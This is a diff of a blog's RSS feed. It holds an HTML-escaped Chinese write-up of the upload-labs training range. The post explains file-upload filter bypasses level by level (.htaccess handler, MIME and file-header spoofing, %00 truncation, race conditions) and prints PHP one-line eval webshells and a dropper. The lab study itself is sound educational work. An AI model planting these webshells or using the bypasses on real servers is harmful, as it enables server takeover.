@@ -13,16 +13,16 @@
         <pubDate>Mon, 06 May 2024 22:39:37 +0800</pubDate>
         
         <guid>https://blog.winglet.com/p/upload-labs%E9%9D%B6%E5%9C%BA/</guid>
-        <description>&lt;img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052319298.jpg" alt="Featured image of post Upload Labs靶场" /&gt;&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
-&lt;p&gt;重新打一下upload-labs靶场，这次会尽可能从代码原理方面去理解漏洞的产生与影响。&lt;/p&gt;
-&lt;h2 id=&#34;搭建&#34;&gt;搭建&lt;/h2&gt;
-&lt;p&gt;这里我使用的是一位大佬自己搭建的upload靶场，不过知识点还是一样的。&lt;a class=&#34;link&#34; href=&#34;https://github.com/sqlsec/upload-labs-docker&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        <description>&lt;img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052319298.jpg" alt="Featured image of post Upload Labs靶场" /&gt;&lt;h2 id=&#34;前言&#34;&gt;前言
+&lt;/h2&gt;&lt;p&gt;重新打一下upload-labs靶场，这次会尽可能从代码原理方面去理解漏洞的产生与影响。&lt;/p&gt;
+&lt;h2 id=&#34;搭建&#34;&gt;搭建
+&lt;/h2&gt;&lt;p&gt;这里我使用的是一位大佬自己搭建的upload靶场，不过知识点还是一样的。&lt;a class=&#34;link&#34; href=&#34;https://github.com/sqlsec/upload-labs-docker&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;GitHub - sqlsec/upload-labs-docker: 国光的文件上传靶场，基于 upload-labs 定制&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;下载他的压缩包后，解压用docker搭建即可。&lt;/p&gt;
 &lt;p&gt;如果用的最新版docker的话，起镜像的名令为&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker compose up -d
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;upload_1-js&#34;&gt;upload_1 [JS]&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240401223158086.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;upload_1-js&#34;&gt;upload_1 [JS]
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240401223158086.png&#34;
 	
 	
 	
@@ -32,8 +32,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h3&gt;
-&lt;p&gt;这关漏洞在于它只进行前端验证。右键查看源代码&lt;/p&gt;
+&lt;h3 id=&#34;漏洞分析&#34;&gt;漏洞分析
+&lt;/h3&gt;&lt;p&gt;这关漏洞在于它只进行前端验证。右键查看源代码&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404012233163.png&#34;
 	
 	
@@ -47,8 +47,8 @@
 &lt;p&gt;可以看到这段js代码的作用就是对上传的文件进行判断和过滤。&lt;/p&gt;
 &lt;p&gt;就是我们只有在上传&lt;code&gt;.jpg .png .gif .jpeg&lt;/code&gt;后缀文件时，才能上传成功。&lt;/p&gt;
 &lt;p&gt;但是它只进行了前端验证，所以只要上传一个符合条件的文件，在前端验证完把文件放走后用bp抓包，在它即将把数据发送给后端时，将文件名修改为&lt;code&gt;.php&lt;/code&gt;文件，就能成功上传该木马。&lt;/p&gt;
-&lt;h3 id=&#34;解决方法&#34;&gt;解决方法&lt;/h3&gt;
-&lt;p&gt;我们先创建一个一句话木马文件，内容如下&lt;/p&gt;
+&lt;h3 id=&#34;解决方法&#34;&gt;解决方法
+&lt;/h3&gt;&lt;p&gt;我们先创建一个一句话木马文件，内容如下&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
@@ -87,8 +87,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;出现这个绿标就宣告我们成功了&lt;/p&gt;
-&lt;h2 id=&#34;upload-2-htaccess&#34;&gt;upload-2 [.htaccess]&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022010190.png&#34;
+&lt;h2 id=&#34;upload-2-htaccess&#34;&gt;upload-2 [.htaccess]
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022010190.png&#34;
 	
 	
 	
@@ -98,8 +98,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;漏洞分析-1&#34;&gt;漏洞分析&lt;/h3&gt;
-&lt;p&gt;这个靶场带有源码，所以就用源码来讲解，如果是实际情况，那肯定是不能看到的，只能自己去一个一个尝试。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞分析-1&#34;&gt;漏洞分析
+&lt;/h3&gt;&lt;p&gt;这个靶场带有源码，所以就用源码来讲解，如果是实际情况，那肯定是不能看到的，只能自己去一个一个尝试。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022007333.png&#34;
 	
 	
@@ -120,8 +120,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;这段代码是一个Apache HTTP服务器的配置，用于将对以&amp;#34;.jpg&amp;#34;结尾的URL请求的处理器设置为PHP解析器。当Apache服务器收到以&amp;#34;.jpg&amp;#34;结尾的请求时，它会将请求交给PHP解析器来处理，而不是将其作为静态图片文件返回。
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;在这段配置中，&amp;lt;FilesMatch&amp;gt;标签用于匹配特定的文件名模式，这里是匹配以&amp;#34;.jpg&amp;#34;结尾的文件。SetHandler指令用于设置与匹配的文件相关联的处理器，这里是将处理器设置为application/x-httpd-php，即PHP解析器。
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;起到的作用就是，我们上传的&lt;code&gt;.jpg&lt;/code&gt;文件，会被自动当作&lt;code&gt;.php&lt;/code&gt;文件进行执行。&lt;/p&gt;
-&lt;h3 id=&#34;解决方法-1&#34;&gt;解决方法&lt;/h3&gt;
-&lt;p&gt;首先创建一个&lt;code&gt;.htaccess&lt;/code&gt;文件，在里面写入上面说的内容，然后上传&lt;/p&gt;
+&lt;h3 id=&#34;解决方法-1&#34;&gt;解决方法
+&lt;/h3&gt;&lt;p&gt;首先创建一个&lt;code&gt;.htaccess&lt;/code&gt;文件，在里面写入上面说的内容，然后上传&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022021780.png&#34;
 	
 	
@@ -145,8 +145,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;连接成功，而且可以看到我们连接的文件后缀还是&lt;code&gt;.jpg&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;upload-3-mime&#34;&gt;upload-3 [MIME]&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022044958.png&#34;
+&lt;h2 id=&#34;upload-3-mime&#34;&gt;upload-3 [MIME]
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022044958.png&#34;
 	
 	
 	
@@ -156,13 +156,13 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;漏洞分析-2&#34;&gt;漏洞分析&lt;/h3&gt;
-&lt;p&gt;我们先介绍一下MIME&lt;/p&gt;
+&lt;h3 id=&#34;漏洞分析-2&#34;&gt;漏洞分析
+&lt;/h3&gt;&lt;p&gt;我们先介绍一下MIME&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MIME（Multipurpose Internet Mail Extensions）是一种标准，用于标识互联网上不同类型的文件和媒体内容。MIME类型由两部分组成：主类型（top-level type）和子类型（sub-type），用斜杠分隔。例如，`text/html`和`image/jpeg`都是MIME类型。
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MIME类型用于指示文件或数据的性质和格式，以便客户端和服务器可以正确地处理和解释内容。它在HTTP协议中的`Content-Type`头部字段中使用。
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这关没有源码可看，但对上传文件还是进行了限制。需要测试什么文件类型可以上传，然后我们再上传木马文件，并将其的&lt;code&gt;MIME&lt;/code&gt;类型修改为可以上传的类型。&lt;/p&gt;
-&lt;h3 id=&#34;解决方法-2&#34;&gt;解决方法&lt;/h3&gt;
-&lt;p&gt;我们先上传&lt;code&gt;.jpg&lt;/code&gt;文件，并抓包看看数据&lt;/p&gt;
+&lt;h3 id=&#34;解决方法-2&#34;&gt;解决方法
+&lt;/h3&gt;&lt;p&gt;我们先上传&lt;code&gt;.jpg&lt;/code&gt;文件，并抓包看看数据&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022054068.png&#34;
 	
 	
@@ -187,8 +187,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;成功&lt;/p&gt;
-&lt;h2 id=&#34;upload-4-文件头&#34;&gt;upload-4 [文件头]&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404052257430.png&#34;
+&lt;h2 id=&#34;upload-4-文件头&#34;&gt;upload-4 [文件头]
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404052257430.png&#34;
 	
 	
 	
@@ -198,8 +198,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;漏洞分析-3&#34;&gt;漏洞分析&lt;/h3&gt;
-&lt;p&gt;这关有源码，所有就可以看源码进行分析。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞分析-3&#34;&gt;漏洞分析
+&lt;/h3&gt;&lt;p&gt;这关有源码，所有就可以看源码进行分析。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404052300382.png&#34;
 	
 	
@@ -212,8 +212,8 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;这就是关键的部分，可以看到有两个白名单，第一个就是上一关讲到的&lt;code&gt;MIME&lt;/code&gt;类型，这个绕过的方法就不再讲述了。&lt;/p&gt;
 &lt;p&gt;第二个就是检测你的文件头，看你的文件头是否和&lt;code&gt;.gif .jpg .png&lt;/code&gt;文件的文件头一致，而我们只需要在代码前面加上相应的文件头字符串即可。常用的就是&lt;code&gt;GIF89a&lt;/code&gt;&lt;/p&gt;
-&lt;h3 id=&#34;解决方法-3&#34;&gt;解决方法&lt;/h3&gt;
-&lt;p&gt;先上传一句话木马文件，然后抓包&lt;/p&gt;
+&lt;h3 id=&#34;解决方法-3&#34;&gt;解决方法
+&lt;/h3&gt;&lt;p&gt;先上传一句话木马文件，然后抓包&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404052309393.png&#34;
 	
 	
@@ -236,8 +236,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;然后发包，即可上传成功，接着就可以蚁剑连接。&lt;/p&gt;
-&lt;h2 id=&#34;upload-5-代码缺陷1&#34;&gt;upload-5 [代码缺陷1]&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062152525.png&#34;
+&lt;h2 id=&#34;upload-5-代码缺陷1&#34;&gt;upload-5 [代码缺陷1]
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062152525.png&#34;
 	
 	
 	
@@ -247,13 +247,13 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;漏洞分析-4&#34;&gt;漏洞分析&lt;/h3&gt;
-&lt;p&gt;有缺陷的代码，已经在界面上展示了，所以就直接分析这三句代码即可。可以看到它还是设了一个黑名单，不过它与前几关的不同点是它并没有禁止这些文件上传，而是修改这些文件的名称。比如上传了一个&lt;code&gt;1.php&lt;/code&gt;的文件，它依然可以上传成功，但是我们会搜不到这个文件。因为该文件名称中有&lt;code&gt;php&lt;/code&gt;这段字符串，所以就会把它替换为空字符，文件名就变成了&lt;code&gt;1&lt;/code&gt;。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞分析-4&#34;&gt;漏洞分析
+&lt;/h3&gt;&lt;p&gt;有缺陷的代码，已经在界面上展示了，所以就直接分析这三句代码即可。可以看到它还是设了一个黑名单，不过它与前几关的不同点是它并没有禁止这些文件上传，而是修改这些文件的名称。比如上传了一个&lt;code&gt;1.php&lt;/code&gt;的文件，它依然可以上传成功，但是我们会搜不到这个文件。因为该文件名称中有&lt;code&gt;php&lt;/code&gt;这段字符串，所以就会把它替换为空字符，文件名就变成了&lt;code&gt;1&lt;/code&gt;。&lt;/p&gt;
 &lt;p&gt;所以我们的绕过方法就是用字符拼接进行绕过。比如上传&lt;code&gt;1.pphphp&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;它会检测到&lt;code&gt;php&lt;/code&gt;这段字符串，但是就算把它替换为空字符了,我们的文件依然是&lt;code&gt;php&lt;/code&gt;文件&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1.pphphp  --&amp;gt; 1.php
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;解决方法-4&#34;&gt;解决方法&lt;/h3&gt;
-&lt;p&gt;把木马文件的后缀改为&lt;code&gt;.pphphp&lt;/code&gt;，然后上传&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;解决方法-4&#34;&gt;解决方法
+&lt;/h3&gt;&lt;p&gt;把木马文件的后缀改为&lt;code&gt;.pphphp&lt;/code&gt;，然后上传&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062235289.png&#34;
 	
 	
@@ -276,8 +276,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;接着用蚁剑连接即可&lt;/p&gt;
-&lt;h2 id=&#34;upload-6-代码缺陷2&#34;&gt;upload-6 [代码缺陷2]&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062240573.png&#34;
+&lt;h2 id=&#34;upload-6-代码缺陷2&#34;&gt;upload-6 [代码缺陷2]
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062240573.png&#34;
 	
 	
 	
@@ -287,10 +287,10 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;漏洞分析-5&#34;&gt;漏洞分析&lt;/h3&gt;
-&lt;p&gt;这个问题代码其实和上关差不多，但是它是把黑民单的字符改为了空格符，这就导致字符复写的方法用不了了，但是它提示我们用的系统是Windows系统，在Windows系统中是区分大小写的，所以就可以通过大小写进行绕过。linux系统是不区分大小写的，所以大小写绕过的方法是无法成功的。&lt;/p&gt;
-&lt;h3 id=&#34;解决方法-5&#34;&gt;解决方法&lt;/h3&gt;
-&lt;p&gt;将后缀改为&lt;code&gt;.PHp&lt;/code&gt;，然后上传&lt;/p&gt;
+&lt;h3 id=&#34;漏洞分析-5&#34;&gt;漏洞分析
+&lt;/h3&gt;&lt;p&gt;这个问题代码其实和上关差不多，但是它是把黑民单的字符改为了空格符，这就导致字符复写的方法用不了了，但是它提示我们用的系统是Windows系统，在Windows系统中是区分大小写的，所以就可以通过大小写进行绕过。linux系统是不区分大小写的，所以大小写绕过的方法是无法成功的。&lt;/p&gt;
+&lt;h3 id=&#34;解决方法-5&#34;&gt;解决方法
+&lt;/h3&gt;&lt;p&gt;将后缀改为&lt;code&gt;.PHp&lt;/code&gt;，然后上传&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062245383.png&#34;
 	
 	
@@ -302,8 +302,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;文件后缀没有改变。&lt;/p&gt;
-&lt;h2 id=&#34;upload-7-get型00截断&#34;&gt;upload-7 [GET型%00截断]&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404092219938.png&#34;
+&lt;h2 id=&#34;upload-7-get型00截断&#34;&gt;upload-7 [GET型%00截断]
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404092219938.png&#34;
 	
 	
 	
@@ -313,8 +313,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;漏洞分析-6&#34;&gt;漏洞分析&lt;/h3&gt;
-&lt;p&gt;这是上传部分的代码。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞分析-6&#34;&gt;漏洞分析
+&lt;/h3&gt;&lt;p&gt;这是上传部分的代码。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404092224839.png&#34;
 	
 	
@@ -352,8 +352,8 @@
 &lt;p&gt;这是我们上传并抓包得到的数据。我们上传一个&lt;code&gt;jpg&lt;/code&gt;文件，来通过白名单。之后存储文件的时候&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$des&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;road&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里的&lt;code&gt;road=../upload/1.php%004535524.jpg&lt;/code&gt;，&lt;code&gt;%00&lt;/code&gt;后面的被省略了，就导致我们上传的是&lt;code&gt;1.php&lt;/code&gt;文件，而&lt;code&gt;1.jpg&lt;/code&gt;文件中的内容也会被写入&lt;code&gt;1.php&lt;/code&gt;文件内，通过这中方法就上传了一个木马文件。&lt;/p&gt;
-&lt;h2 id=&#34;upload-9-黑名单缺陷&#34;&gt;upload-9 [黑名单缺陷]&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404071332353.png&#34;
+&lt;h2 id=&#34;upload-9-黑名单缺陷&#34;&gt;upload-9 [黑名单缺陷]
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404071332353.png&#34;
 	
 	
 	
@@ -363,12 +363,12 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;漏洞分析-7&#34;&gt;漏洞分析&lt;/h3&gt;
-&lt;p&gt;这关的问题主页已经提到了，就是在设置黑名单的时候，忽略了其他文件，导致那些文件正好也可以被执行。比如在apache服务器中，除了&lt;code&gt;.php&lt;/code&gt;文件会被作为php文件执行，还有&lt;/p&gt;
+&lt;h3 id=&#34;漏洞分析-7&#34;&gt;漏洞分析
+&lt;/h3&gt;&lt;p&gt;这关的问题主页已经提到了，就是在设置黑名单的时候，忽略了其他文件，导致那些文件正好也可以被执行。比如在apache服务器中，除了&lt;code&gt;.php&lt;/code&gt;文件会被作为php文件执行，还有&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;phtml  php5  php3  php4  pht  phps  php3p
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以就可以把木马文件的后缀改为它们中的一个，依然可以上传成功。&lt;/p&gt;
-&lt;h3 id=&#34;解决方法-6&#34;&gt;解决方法&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404071337747.png&#34;
+&lt;h3 id=&#34;解决方法-6&#34;&gt;解决方法
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404071337747.png&#34;
 	
 	
 	
@@ -390,8 +390,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;连接成功&lt;/p&gt;
-&lt;h2 id=&#34;upload-10-条件竞争&#34;&gt;upload-10 [条件竞争]&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052323010.png&#34;
+&lt;h2 id=&#34;upload-10-条件竞争&#34;&gt;upload-10 [条件竞争]
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052323010.png&#34;
 	
 	
 	
@@ -401,12 +401,12 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;漏洞分析-8&#34;&gt;漏洞分析&lt;/h3&gt;
-&lt;p&gt;​	直接看代码，可以看到文件先会被成功上传，然后才会根据白名单，进行修改文件名或者删除文件，所以如果我们能在程序在改变文件之前访问文件，就能成功执行该木马文件。但因为它只能存在一会儿，所以木马的内容需要修改&lt;/p&gt;
+&lt;h3 id=&#34;漏洞分析-8&#34;&gt;漏洞分析
+&lt;/h3&gt;&lt;p&gt;​	直接看代码，可以看到文件先会被成功上传，然后才会根据白名单，进行修改文件名或者删除文件，所以如果我们能在程序在改变文件之前访问文件，就能成功执行该木马文件。但因为它只能存在一会儿，所以木马的内容需要修改&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;fputs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;xiao.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php eval($_REQUEST[1]);?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这段代码意思就是在当前目录下创建一个名为&lt;code&gt;xiao.php&lt;/code&gt;的一句话木马，只要我们执行了文件，就能成功写入一句话木马。&lt;/p&gt;
-&lt;h3 id=&#34;解决方法-7&#34;&gt;解决方法&lt;/h3&gt;
-&lt;p&gt;上传文件，然后用bp抓包&lt;/p&gt;
+&lt;h3 id=&#34;解决方法-7&#34;&gt;解决方法
+&lt;/h3&gt;&lt;p&gt;上传文件，然后用bp抓包&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404162151382.png&#34;
 	
 	
@@ -450,8 +450,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h2 id=&#34;upload-11-二次渲染&#34;&gt;upload-11 [二次渲染]&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171255256.png&#34;
+&lt;h2 id=&#34;upload-11-二次渲染&#34;&gt;upload-11 [二次渲染]
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171255256.png&#34;
 	
 	
 	
@@ -461,10 +461,10 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;漏洞分析-9&#34;&gt;漏洞分析&lt;/h3&gt;
-&lt;p&gt;这里的关键就在于&lt;code&gt;imagecreatefromxxx&lt;/code&gt;这个函数，它会把我们上传的图片文件进行一次渲染，导致的结果就是图片中的二进制数据可能会发生改变，也就是我们上传的图片码会被渲染成一张普通图片，里面用于执行的代码可能会被修改删除。但是我们依然有绕过的办法，就如该页面所给出的提示。&lt;/p&gt;
-&lt;h4 id=&#34;gif&#34;&gt;gif&lt;/h4&gt;
-&lt;p&gt;准备一张gif图&lt;/p&gt;
+&lt;h3 id=&#34;漏洞分析-9&#34;&gt;漏洞分析
+&lt;/h3&gt;&lt;p&gt;这里的关键就在于&lt;code&gt;imagecreatefromxxx&lt;/code&gt;这个函数，它会把我们上传的图片文件进行一次渲染，导致的结果就是图片中的二进制数据可能会发生改变，也就是我们上传的图片码会被渲染成一张普通图片，里面用于执行的代码可能会被修改删除。但是我们依然有绕过的办法，就如该页面所给出的提示。&lt;/p&gt;
+&lt;h4 id=&#34;gif&#34;&gt;gif
+&lt;/h4&gt;&lt;p&gt;准备一张gif图&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171301431.gif&#34;
 	
 	
@@ -509,11 +509,11 @@
 	
 &gt;&lt;/p&gt;
